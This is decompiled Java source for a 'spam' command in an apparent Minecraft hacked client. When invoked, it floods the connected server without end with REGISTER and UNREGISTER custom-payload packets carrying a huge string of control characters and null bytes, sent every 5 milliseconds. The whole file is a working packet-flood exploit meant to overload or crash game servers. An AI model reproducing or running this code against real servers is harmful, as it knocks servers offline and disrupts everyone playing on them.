// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.commands.impl;

import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import me.amkgre.bettercraft.client.commands.Command;

public class SpamCommand extends Command
{
    @Override
    public void execute(final String[] args) {
        if (args.length == 0) {
            final PacketBuffer buf = new PacketBuffer(Unpooled.buffer());
            String s = "";
            for (int q = 0; q < 50; ++q) {
                for (int i = 0; i < 255; ++i) {
                    s = String.valueOf(String.valueOf(s)) + (char)i + "\u0000";
                }
            }
            s = String.valueOf(String.valueOf(s)) + " ";
            buf.writeString(s);
            try {
                while (true) {
                    Minecraft.getMinecraft().getConnection().getNetworkManager().channel.writeAndFlush(new CPacketCustomPayload("REGISTER", buf));
                    Minecraft.getMinecraft().getConnection().getNetworkManager().channel.writeAndFlush(new CPacketCustomPayload("UNREGISTER", buf));
                    Thread.sleep(5L);
                }
            }
            catch (final InterruptedException q2) {}
        }
    }
    
    @Override
    public String getName() {
        return "spam";
    }
}
